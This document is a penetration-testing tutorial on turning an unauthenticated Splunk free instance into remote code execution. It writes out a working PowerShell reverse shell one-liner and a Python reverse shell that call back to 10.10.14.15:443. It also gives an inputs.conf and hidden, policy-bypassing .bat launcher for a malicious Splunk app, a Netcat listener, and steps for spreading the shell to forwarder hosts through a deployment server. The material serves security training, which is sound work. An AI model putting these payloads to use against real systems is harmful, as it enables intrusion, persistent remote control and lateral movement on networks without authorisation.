


Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics.



# Discovery/Footprinting

Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. While uncommon, we may encounter Splunk externally facing at times. Let's imagine that we uncover a forgotten instance of Splunk in our Aquatone report that has since automatically converted to the free version, which does not require authentication. Since we have yet to gain a foothold in the internal network, let's focus our attention on Splunk and see if we can turn this access into RCE.

- The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are admin:changeme, which are displayed on the login page.


# Enumeration

The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication. It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about. This will automatically convert to the free version that does not have any form of authentication, introducing a security hole in the environment. 




# Abusing Built-In Functionality
    


[splunk reverse shell](   https://github.com/0xjpuff/reverse_shell_splunk  )

create a custom Splunk application using the following directory structure.

```
$ tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```

The bin directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner.

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The inputs.conf file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.

```

    $ cat inputs.conf 

    [script://./bin/rev.py]
    disabled = 0  
    interval = 10  
    sourcetype = shell 

    [script://.\bin\run.bat]
    disabled = 0
    sourcetype = shell
    interval = 10
```

We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.

```
    @ECHO OFF
    PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
    Exit
```

Once the files are created, we can create a tarball or .spl file.

```
$ tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf

````
The next step is to choose Install app from file and upload the application.

Before uploading the malicious custom app, let's start a listener using Netcat or socat.

`$nc -lnvp 443`


On the Upload app page, click on browse, choose the tarball we created earlier and click Upload.

As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to Enabled.

If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.

````    
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

# Spread in the network

If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.

    